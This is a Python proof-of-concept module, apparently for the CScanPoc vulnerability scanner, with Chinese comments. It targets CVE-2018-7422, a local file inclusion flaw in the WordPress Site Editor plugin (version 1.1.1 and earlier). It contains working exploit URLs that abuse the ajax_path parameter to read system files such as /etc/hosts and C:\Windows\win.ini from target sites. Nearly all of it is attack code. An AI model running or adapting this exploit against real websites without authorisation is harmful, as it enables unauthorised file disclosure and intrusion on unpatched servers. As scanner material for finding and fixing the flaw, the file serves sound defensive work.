# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0116'  # 平台漏洞编号
    name = 'WordPress插件Site Editor本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2018-04-10'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    WordPress Site Editor插件1.1.1及之前版本中存在本地文件包含漏洞。远程攻击者可通过向editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php文件发送‘ajax_path’参数利用该漏洞检索任意文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-07363'
    cnvd_id = 'CNVD-2018-07363'  # cnvd漏洞编号
    cve_id = 'CVE-2018-7422'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Site Editor <=1.1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ef090bf7-30ef-4890-9d37-e347fdc5fa79'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            win_payload = "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\Windows\win.ini"
            linux_payload = "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/hosts"
            win_url = arg + win_payload
            linux_url = arg + linux_payload

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            win_response = requests.get(win_url)
            linux_response = requests.get(linux_url)
            self.output.info("正在尝试读取系统敏感文件信息")
            if win_response.status_code == 200 and 'extensions' in win_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if linux_response.status_code == 200 and 'localhost' in linux_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
